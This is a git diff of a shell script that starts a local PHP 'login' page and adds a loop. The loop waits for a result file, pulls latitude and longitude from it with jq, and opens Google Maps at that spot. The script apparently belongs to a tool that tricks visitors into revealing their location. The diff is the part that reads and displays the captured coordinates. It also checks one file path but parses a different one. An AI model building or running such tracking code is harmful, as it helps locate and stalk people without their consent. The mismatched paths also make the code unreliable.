@@ -77,4 +77,14 @@ php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt 2>&1 &
 printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:8084 ${R0}\n"
 xdg-open http://127.0.0.1:8084
 #<<<---Get location--->>>#
-tail -f $CWD/assets/send/php/info.txt $CWD/assets/send/php/result.txt
+while true; do
+    if [ -z $(cat $CWD/assets/send/result.txt) ]; then
+        sleep 0.3
+    else
+        latitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lat)
+        longitude=$(cat $CWD/assets/send/php/result.txt | jq -r .info[].lon)
+        break
+    fi
+done
+xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
+printf "${S7}[${S4}+${S7}] ${S2}Location Link${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n"
